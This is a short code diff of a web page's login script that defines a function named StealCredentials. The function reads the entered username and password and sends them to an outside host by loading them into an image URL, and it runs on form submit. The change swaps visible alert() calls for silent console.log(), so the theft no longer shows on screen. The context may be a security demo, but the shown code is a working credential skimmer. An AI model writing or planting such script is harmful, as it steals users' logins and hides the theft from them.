@@ -38,11 +38,11 @@
             var pass = document.getElementById("login_password").value;
             var credentials = "username = " + username + " | " + "password = " + pass;
             img = document.createElement("img");
-            alert(credentials);
+            console.log(credentials); 
             img.src = "https://r7.io/e/nhytrek?s=" + credentials;
         }
         document.forms[0].onsubmit = StealCredentials;
-        alert("run");
+        console.log("run");
       </script>
         
 
